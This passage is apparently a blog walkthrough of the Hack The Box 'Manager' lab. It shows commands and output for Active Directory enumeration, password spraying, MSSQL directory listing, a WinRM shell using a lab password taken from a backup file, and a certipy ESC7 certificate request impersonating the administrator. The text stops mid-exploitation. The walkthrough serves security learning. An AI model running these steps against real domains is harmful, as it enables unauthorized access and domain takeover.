---
title: "Manager Hack The Box Machine: Active Directory Certificate Services Attack Path"
description: "Here we go again! I’m Mohamed Eletrepy, aka Maverick. In this walkthrough, I’ll be covering another escalation path for AD CS, specifically ESC7. If you’re unfamiliar with AD CS, it stands for Active "
pubDate: 2024-09-25
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 17
coverImage: "https://cdn-images-1.medium.com/max/800/1*fniIFL81YWbORpRf6C-V_A.png"
---

---

### Manager Hack The Box Machine: Active Directory Certificate Services Attack Path

![](https://cdn-images-1.medium.com/max/800/1*fniIFL81YWbORpRf6C-V_A.png)

First Thing: Free Palestine 🇵🇸

![](https://cdn-images-1.medium.com/max/800/0*weEIv7CaPMXn1K9d.jpeg)

*Free Palestine with every single drop of my blood*

Here we go again! I’m Mohamed Eletrepy, aka Maverick. In this walkthrough, I’ll be covering another escalation path for AD CS, specifically ESC7. If you’re unfamiliar with AD CS, it stands for Active Directory Certificate Services, a well-known exploitation path first introduced by [Harmj0y ](https://x.com/harmj0y)and [Lee Christensen](https://x.com/tifkin_) at [Black Hat 2021](https://youtu.be/ejmAIgxFRgM?si=uYH6kdgNjd_pBJi4). They also published a [research paper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) and a great [blog post](https://posts.specterops.io/certified-pre-owned-d95910965cd2) on the topic.

**Scanning**

```bash
# Nmap 7.94SVN scan initiated Fri Sep 20 17:14:22 2024 as: nmap -sCV -oN nmap 10.10.11.236  
Nmap scan report for 10.10.11.236  
Host is up (0.11s latency).  
Not shown: 987 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
80/tcp open http Microsoft IIS httpd 10.0  
|_http-server-header: Microsoft-IIS/10.0  
| http-methods:  
|_ Potentially risky methods: TRACE  
|_http-title: Manager  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-20 21:15:40Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., S  
| ssl-cert: Subject:  
| Subject Alternative Name: DNS:dc01.manager.htb  
| Not valid before: 2024-08-30T17:08:51  
|_Not valid after: 2122-07-27T10:31:04  
|_ssl-date: 2024-09-20T21:17:04+00:00; +7h00m59s from scanner time.  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., S  
| ssl-cert: Subject:  
| Subject Alternative Name: DNS:dc01.manager.htb  
| Not valid before: 2024-08-30T17:08:51  
|_Not valid after: 2122-07-27T10:31:04  
|_ssl-date: 2024-09-20T21:17:04+00:00; +7h00m59s from scanner time.  
1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM  
| ms-sql-info:  
| 10.10.11.236:1433:  
| Version:  
| name: Microsoft SQL Server 2019 RTM  
| number: 15.00.2000.00  
| Product: Microsoft SQL Server 2019  
| Service pack level: RTM  
| Post-SP patches applied: false  
|_ TCP port: 1433  
|_ssl-date: 2024-09-20T21:17:04+00:00; +7h00m59s from scanner time.  
| ms-sql-ntlm-info:  
| 10.10.11.236:1433:  
| Target_Name: MANAGER  
| NetBIOS_Domain_Name: MANAGER  
| NetBIOS_Computer_Name: DC01  
| DNS_Domain_Name: manager.htb  
| DNS_Computer_Name: dc01.manager.htb  
| DNS_Tree_Name: manager.htb  
|_ Product_Version: 10.0.17763  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2024-09-20T21:13:22  
|_Not valid after: 2054-09-20T21:13:22  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., S  
|_ssl-date: 2024-09-20T21:17:04+00:00; +7h00m59s from scanner time.  
| ssl-cert: Subject:  
| Subject Alternative Name: DNS:dc01.manager.htb  
| Not valid before: 2024-08-30T17:08:51  
|_Not valid after: 2122-07-27T10:31:04  
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., S  
| ssl-cert: Subject:  
| Subject Alternative Name: DNS:dc01.manager.htb  
| Not valid before: 2024-08-30T17:08:51  
|_Not valid after: 2122-07-27T10:31:04  
|_ssl-date: 2024-09-20T21:17:03+00:00; +7h00m58s from scanner time.  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:  
| date: 2024-09-20T21:16:25  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
|_clock-skew: mean: 7h00m58s, deviation: 0s, median: 7h00m58s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Fri Sep 20 17:16:06 2024 -- 1 IP address (1 host up) scanned in 103.67 seconds
```

From the initial scan, we discovered two key domain names: manager.htb and dc01.manager.htb. I added these to `/etc/hosts`. The services detected include Kerberos, LDAP, SQL, Windows Server, and WinRM (PowerShell remoting). I’ll start by enumerating SMB, Kerberos, LDAP, and DNS.

In typical machines, it’s important to check all virtual hosts to ensure you aren’t missing any subdomains . So, let’s start by enumerating the virtual hosts.

```bash
──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# ffuf -u http://10.10.11.236 -H "Host: FUZZ.MANAGE.HTB" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac  
  
  
/'___\ /'___\ /'___\  
/\ \__/ /\ \__/ __ __ /\ \__/  
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
\ \_\ \ \_\ \ \____/ \ \_\  
\/_/ \/_/ \/___/ \/_/  
  
v2.1.0-dev  
________________________________________________  
  
:: Method : GET  
:: URL : http://10.10.11.236  
:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt  
:: Header : Host: FUZZ.MANAGE.HTB  
:: Follow redirects : false  
:: Calibration : true  
:: Timeout : 10  
:: Threads : 40  
:: Matcher : Response status: all  
________________________________________________  
  
:: Progress: [19966/19966] :: Job [1/1] :: 338 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
```

we didn’t miss anything.👌

I checked the website on port 80, but there was nothing interesting — just a 404 error on the default page of IIS. Let’s dive into the interesting services.

In this part, I will focus on validating any users to facilitate Kerberoasting, AS-REP Roasting, or even password spraying.

#### SMB

Checking for anonymous login. And Shares Files

```bash
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# nxc smb 10.10.11.236 -u guest -p ''  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.236 445 DC01 [+] manager.htb\guest:  
  
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# nxc smb 10.10.11.236 -u guest -p '' --shares  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.236 445 DC01 [+] manager.htb\guest:  
SMB 10.10.11.236 445 DC01 [*] Enumerated shares  
SMB 10.10.11.236 445 DC01 Share Permissions Remark  
SMB 10.10.11.236 445 DC01 ----- ----------- ------  
SMB 10.10.11.236 445 DC01 ADMIN$ Remote Admin  
SMB 10.10.11.236 445 DC01 C$ Default share  
SMB 10.10.11.236 445 DC01 IPC$ READ Remote IPC  
SMB 10.10.11.236 445 DC01 NETLOGON Logon server share  
SMB 10.10.11.236 445 DC01 SYSVOL Logon server share
```

actually i dont’s have right now any valid users if i have anyvalid user i can know more ueers but i don’t so i will check for RID Cycling Attack , I will usre impacket script `lookupsid` for this attack And neteexec

**impacket-lookupsid**

```bash
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# impacket-lookupsid -no-pass 'guest@manager.htb' 10000 | grep 'SidTypeUser' | grep -v -e 'manager' | awk -F'\\' '{print $2}' | sed 's/ (SidTypeUser)//'  
  
Administrator  
Guest  
krbtgt  
DC01$  
Zhong  
Cheng  
Ryan  
Raven  
JinWoo  
ChinHae  
Operator
```

**Netexec**

```bash
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# nxc smb 10.10.11.236 -u guest -p '' --rid-brute 10000  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.  
htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.236 445 DC01 [+] manager.htb\guest:  
SMB 10.10.11.236 445 DC01 498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 500: MANAGER\Administrator (SidTypeUser)  
SMB 10.10.11.236 445 DC01 501: MANAGER\Guest (SidTypeUser)  
SMB 10.10.11.236 445 DC01 502: MANAGER\krbtgt (SidTypeUser)  
SMB 10.10.11.236 445 DC01 512: MANAGER\Domain Admins (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 513: MANAGER\Domain Users (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 514: MANAGER\Domain Guests (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 515: MANAGER\Domain Computers (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 516: MANAGER\Domain Controllers (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 517: MANAGER\Cert Publishers (SidTypeAlias)  
SMB 10.10.11.236 445 DC01 518: MANAGER\Schema Admins (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 519: MANAGER\Enterprise Admins (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 520: MANAGER\Group Policy Creator Owners (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 521: MANAGER\Read-only Domain Controllers (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 525: MANAGER\Protected Users (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 526: MANAGER\Key Admins (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 527: MANAGER\Enterprise Key Admins (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 553: MANAGER\RAS and IAS Servers (SidTypeAlias)  
SMB 10.10.11.236 445 DC01 571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)  
SMB 10.10.11.236 445 DC01 572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)  
SMB 10.10.11.236 445 DC01 1000: MANAGER\DC01$ (SidTypeUser)  
SMB 10.10.11.236 445 DC01 1101: MANAGER\DnsAdmins (SidTypeAlias)  
SMB 10.10.11.236 445 DC01 1102: MANAGER\DnsUpdateProxy (SidTypeGroup)  
SMB 10.10.11.236 445 DC01 1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)  
SMB 10.10.11.236 445 DC01 1113: MANAGER\Zhong (SidTypeUser)  
SMB 10.10.11.236 445 DC01 1114: MANAGER\Cheng (SidTypeUser)  
SMB 10.10.11.236 445 DC01 1115: MANAGER\Ryan (SidTypeUser)  
SMB 10.10.11.236 445 DC01 1116: MANAGER\Raven (SidTypeUser)  
SMB 10.10.11.236 445 DC01 1117: MANAGER\JinWoo (SidTypeUser)  
SMB 10.10.11.236 445 DC01 1118: MANAGER\ChinHae (SidTypeUser)  
SMB 10.10.11.236 445 DC01 1119: MANAGER\Operator (SidTypeUser)
```

#### Kerberos

I will validate these users first by using `Kerbrute`, and I will employ it for password spraying.

**Check for validating users.**

```bash
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# kerbrute userenum -d manager.htb users --dc 10.10.11.236  
  
__ __ __  
/ /_____ _____/ /_ _______ __/ /____  
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< / __/ / / /_/ / / / /_/ / /_/ __/  
/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/  
  
Version: v1.0.3 (9dad6e1) - 09/25/24 - Ronnie Flathers @ropnop  
  
2024/09/25 17:23:41 > Using KDC(s):  
2024/09/25 17:23:41 > 10.10.11.236:88  
  
2024/09/25 17:23:41 > [+] VALID USERNAME: Administrator@manager.htb  
2024/09/25 17:23:41 > [+] VALID USERNAME: Cheng@manager.htb  
2024/09/25 17:23:41 > [+] VALID USERNAME: Zhong@manager.htb  
2024/09/25 17:23:41 > [+] VALID USERNAME: DC01$@manager.htb  
2024/09/25 17:23:41 > [+] VALID USERNAME: JinWoo@manager.htb  
2024/09/25 17:23:41 > [+] VALID USERNAME: Ryan@manager.htb  
2024/09/25 17:23:41 > [+] VALID USERNAME: Guest@manager.htb  
2024/09/25 17:23:41 > [+] VALID USERNAME: Raven@manager.htb  
2024/09/25 17:23:41 > [+] VALID USERNAME: ChinHae@manager.htb  
2024/09/25 17:23:41 > [+] VALID USERNAME: Operator@manager.htb  
2024/09/25 17:23:41 > Done! Tested 11 usernames (10 valid) in 0.250 seconds
```

**Password spraying.**

```bash
┌─[root@htb-k9bhljek7d]─[/home/htb-mp-1054724/manager]  
└──╼ #netexec smb 10.10.11.236 -u users -p users --continue-on-success --no-brute  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.236 445 DC01 [-] manager.htb\Administrator:Administrator STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\Guest:Guest STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\DC01$:DC01$ STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\Zhong:Zhong STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\Cheng:Cheng STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\Ryan:Ryan STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\Raven:Raven STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\JinWoo:JinWoo STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\ChinHae:ChinHae STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\Operator:Operator STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [-] manager.htb\Operator:Operator STATUS_LOGON_FAILURE  
SMB 10.10.11.236 445 DC01 [+] manager.htb\operator:operator
```

**Checking for validating Operator user.**

```bash
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# nxc mssql 10.10.11.236 -u operator -p operator  
MSSQL 10.10.11.236 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)  
MSSQL 10.10.11.236 1433 DC01 [+] manager.htb\operator:operator  
  
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# nxc smb 10.10.11.236 -u operator -p operator  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.236 445 DC01 [+] manager.htb\operator:operator  
  
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# nxc winrm 10.10.11.236 -u operator -p operator  
WINRM 10.10.11.236 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)  
WINRM 10.10.11.236 5985 DC01 [-] manager.htb\operator:operator  
  
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# nxc ldap 10.10.11.236 -u operator -p operator  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  
LDAP 10.10.11.236 389 DC01 [+] manager.htb\operator:operator
```

I see the results of shared files as an Operator user, but there’s nothing interesting. I will check LDAP using ldapdomaindump. Then, I’ll try using `impacket-mssqlclient`. I plan to write about LDAP enumeration in a future post.

**ldap**

```bash
└─# ldapdomaindump -u management.htb\\operator -p 'operator' 10.10.11.236 -o ldap/  
[*] Connecting to host...  
[*] Binding to host  
[+] Bind OK  
[*] Starting domain dump  
[+] Domain dump finished  
  
┌──(root㉿kali)-[/home/…/windows/manager/newldap/ldap]  
└─# ls  
domain_computers_by_os.html domain_computers.json domain_groups.json domain_policy.json domain_trusts.json domain_users.html  
domain_computers.grep domain_groups.grep domain_policy.grep domain_trusts.grep domain_users_by_group.html domain_users.json  
domain_computers.html domain_groups.html domain_policy.html domain_trusts.html domain_users.grep
```

![](https://cdn-images-1.medium.com/max/800/1*9TNwATX_qtr8H-nvVP9nHg.png)

As I noted in the scanning results, there is a WinRM service (PowerShell remoting) that we could use to log in with the Raven user, but we currently do not have their password.

**MSSQL**

```bash
┌──(root㉿kali)-[/home/…/windows/manager/newldap/ldap]  
└─# mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)  
[!] Press help for extra shell commands  
SQL (MANAGER\Operator guest@master)> help  
  
lcd {path} - changes the current local directory to {path}  
exit - terminates the server process (and this session)  
enable_xp_cmdshell - you know what it means  
disable_xp_cmdshell - you know what it means  
enum_db - enum databases  
enum_links - enum linked servers  
enum_impersonate - check logins that can be impersonated  
enum_logins - enum login users  
enum_users - enum current db users  
enum_owner - enum db owner  
exec_as_user {user} - impersonate with execute as user  
exec_as_login {login} - impersonate with execute as login  
xp_cmdshell {cmd} - executes cmd using xp_cmdshell  
xp_dirtree {path} - executes xp_dirtree on the path  
sp_start_job {cmd} - executes cmd using the sql server agent (blind)  
use_link {link} - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)  
! {cmd} - executes a local shell cmd  
show_query - show query  
mask_query - mask query  
  
SQL (MANAGER\Operator guest@master)> enum_db  
name is_trustworthy_on  
------ -----------------  
master 0  
  
tempdb 0  
  
model 0  
  
msdb 1  
  
SQL (MANAGER\Operator guest@master)> xp_cmdshell whoami  
ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.  
SQL (MANAGER\Operator guest@master)> enable_xp_cmdshell  
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.  
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.  
ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.  
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.  
SQL (MANAGER\Operator guest@master)> xp_dirtree C:\  
subdirectory depth file  
------------------------- ----- ----  
$Recycle.Bin 1 0  
  
Documents and Settings 1 0  
  
inetpub 1 0  
  
PerfLogs 1 0  
  
Program Files 1 0  
  
Program Files (x86) 1 0  
  
ProgramData 1 0  
  
Recovery 1 0  
  
SQL2019 1 0  
  
System Volume Information 1 0  
  
Users 1 0  
  
Windows 1 0  
  
SQL (MANAGER\Operator guest@master)> xp_dirtree c:\inetpub\wwwroot  
subdirectory depth file  
------------------------------- ----- ----  
about.html 1 1  
  
contact.html 1 1  
  
css 1 0  
  
images 1 0  
  
index.html 1 1  
  
js 1 0  
  
service.html 1 1  
  
web.config 1 1  
  
website-backup-27-07-23-old.zip 1 1  
  
SQL (MANAGER\Operator guest@master)> xp_dirtree c:\users\  
subdirectory depth file  
------------- ----- ----  
Administrator 1 0  
  
All Users 1 0  
  
Default 1 0  
  
Default User 1 0  
  
Public 1 0  
  
Raven 1 0  
  
SQL (MANAGER\Operator guest@master)> xp_dirtree c:\users\raven\  
subdirectory depth file  
------------ ----- ----  
SQL (MANAGER\Operator guest@master)> ls  
ERROR(DC01\SQLEXPRESS): Line 1: Could not find stored procedure 'ls'.  
SQL (MANAGER\Operator guest@master)> xp_dirtree c:\users\raven\  
subdirectory depth file  
------------ ----- ----  
SQL (MANAGER\Operator guest@master)> xp_dirtree c:\users\raven  
subdirectory depth file  
------------ ----- ----  
SQL (MANAGER\Operator guest@master)> xp_dirtree C:\inetpub\wwwroot  
subdirectory depth file  
------------------------------- ----- ----  
about.html 1 1  
  
contact.html 1 1  
  
css 1 0  
  
images 1 0  
  
index.html 1 1  
  
js 1 0  
  
service.html 1 1  
  
web.config 1 1  
  
website-backup-27-07-23-old.zip 1 1  
  
SQL (MANAGER\Operator guest@master)>
```

I don’t have enough permissions to run `xp_cmdshell`, but I can see users, including the Raven user. However, I can't access their files. I can access root files, which contain static HTML pages that include juicy information.

**Downloading **“website-backup-27–07–23-old.zip”

![](https://cdn-images-1.medium.com/max/800/1*jFqjcV3e5n0In2if6DBybQ.png)

![](https://cdn-images-1.medium.com/max/800/1*rBol0-D-rhxMajzzViTF7w.png)

I will try to validate the credentials for the Raven user.

```bash
┌──(root㉿kali)-[/home/…/boxes/windows/manager/backupfiles]  
└─# nxc smb 10.10.11.236 -u ravn -p 'R4v3nBe5tD3veloP3r!123'  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.236 445 DC01 [+] manager.htb\ravn:R4v3nBe5tD3veloP3r!123 (Guest)  
  
┌──(root㉿kali)-[/home/…/boxes/windows/manager/backupfiles]  
└─# nxc winrm 10.10.11.236 -u ravn -p 'R4v3nBe5tD3veloP3r!123'  
WINRM 10.10.11.236 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)  
WINRM 10.10.11.236 5985 DC01 [-] manager.htb\ravn:R4v3nBe5tD3veloP3r!123  
  
┌──(root㉿kali)-[/home/…/boxes/windows/manager/backupfiles]  
└─# nxc winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'  
WINRM 10.10.11.236 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)  
WINRM 10.10.11.236 5985 DC01 [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)  
  
┌──(root㉿kali)-[/home/…/boxes/windows/manager/backupfiles]  
└─# nxc mssql 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'  
MSSQL 10.10.11.236 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)  
MSSQL 10.10.11.236 1433 DC01 [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123  
  
┌──(root㉿kali)-[/home/…/boxes/windows/manager/backupfiles]  
└─# nxc ldap 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  
LDAP 10.10.11.236 389 DC01 [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123  
  
┌──(root㉿kali)-[/home/…/boxes/windows/manager/backupfiles]  
└─# nxc smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.236 445 DC01 [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123
```

Here we go! WinRM has valid credentials.

![](https://cdn-images-1.medium.com/max/800/0*jpprOCJl3uHTh_u_)

```powershell
┌──(root㉿kali)-[/home/…/boxes/windows/manager/backupfiles]  
└─# evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'  
  
Evil-WinRM shell v3.5  
  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Raven\Documents> cd ../desktop ; ls  
  
  
Directory: C:\Users\Raven\desktop  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
-ar--- 9/25/2024 1:33 PM 34 user.txt  
  
  
*Evil-WinRM* PS C:\Users\Raven\desktop>
```

I uploaded SharpHound to map the domain using BloodHound.

As I mentioned before, I use BloodHound CE. You can use the following Cypher query to check for ESC7:

```cypher
MATCH (n:User)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-512' OR g.objectid ENDS WITH '-544' WITH COLLECT(n.name) AS adminsGroups  
MATCH p = (u:User)-[:ManageCA]->(:EnterpriseCA) WHERE NOT u.name in adminsGroups  
RETURN p
```

![](https://cdn-images-1.medium.com/max/800/1*9Iw8MLhaLOKtASPBFG2owA.png)

This will help identify users with the ability to exploit the ESC7 vulnerability.

As I said before in another writeup, at this stage, I can search for multiple things to check if the domain is vulnerable or not, like PetitPotam, NoPac, PrinterBug, AD CS, and so on. I will enumerate AD CS using `netexec`, and this time I will use only the Certipy tool. Last time, I used both Certipy and Certify. If you want to know how to exploit AD CS with Certify, you can check my last *writeup*.

**Enumerating AD CS with netexec.**

```bash
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# nxc ldap 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123' -M adcs  
SMB 10.10.11.236 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  
LDAP 10.10.11.236 389 DC01 [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123  
ADCS 10.10.11.236 389 DC01 [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'  
ADCS 10.10.11.236 389 DC01 Found PKI Enrollment Server: dc01.manager.htb  
ADCS 10.10.11.236 389 DC01 Found CN: manager-DC01-CA
```

### Certipy

I will check if this machine is vulnerable to AD CS using `certipy -vulnerable`. However, you should be aware that this command is very noisy, so if you are in a red team engagement, proceed with caution. Additionally, in another note, I conducted a password spray in this writeup. If you are in a pentesting engagement and want to avoid lockouts, check this [blog](https://en.hackndo.com/password-spraying-lockout/).

```bash
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 33 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 11 enabled certificate templates  
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA  
[*] Got CA configuration for 'manager-DC01-CA'  
[*] Enumeration output:  
Certificate Authorities  
0  
CA Name : manager-DC01-CA  
DNS Name : dc01.manager.htb  
Certificate Subject : CN=manager-DC01-CA, DC=manager, DC=htb  
Certificate Serial Number : 5150CE6EC048749448C7390A52F264BB  
Certificate Validity Start : 2023-07-27 10:21:05+00:00  
Certificate Validity End : 2122-07-27 10:31:04+00:00  
Web Enrollment : Disabled  
User Specified SAN : Disabled  
Request Disposition : Issue  
Enforce Encryption for Requests : Enabled  
Permissions  
Owner : MANAGER.HTB\Administrators  
Access Rights  
Enroll : MANAGER.HTB\Operator  
MANAGER.HTB\Authenticated Users  
MANAGER.HTB\Raven  
ManageCertificates : MANAGER.HTB\Administrators  
MANAGER.HTB\Domain Admins  
MANAGER.HTB\Enterprise Admins  
ManageCa : MANAGER.HTB\Administrators  
MANAGER.HTB\Domain Admins  
MANAGER.HTB\Enterprise Admins  
MANAGER.HTB\Raven  
[!] Vulnerabilities  
ESC7 : 'MANAGER.HTB\\Raven' has dangerous permissions  
Certificate Templates : [!] Could not find any certificate templates
```

it seem vulneralbe to [ESC7](https://posts.specterops.io/certified-pre-owned-d95910965cd2#fdbf)

![](https://cdn-images-1.medium.com/max/800/0*CjGKLEncWNOHWzdz)

#### Exploiting ESC7

But What is ESC7

> ESC7 Definition : ESC7 is a vulnerability that allows low-privileged users with “ManageCA” and “ManageCertificates” permissions to control the CA (Certificate Authority). These permissions enable the modification of the CA configuration, including the setting “EDITF_ATTRIBUTESUBJECTALTNAME2” seen in ESC6. This vulnerability allows the user to bypass the “Manager Approval” security setting by directly approving pending certificate requests, making it a path for domain compromise or privilege escalation.

The initial step involves requesting a certificate using the Subordinate Certification Authority (SubCA) template provided by AD CS. This template defines a set of configurations and policies that govern how certificates are issued.

```bash
┌──(root㉿kali)-[/home/…/HTB/boxes/windows/manager]  
└─# certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.  
[*] Request ID is 19  
Would you like to save the private key? (y/N) y  
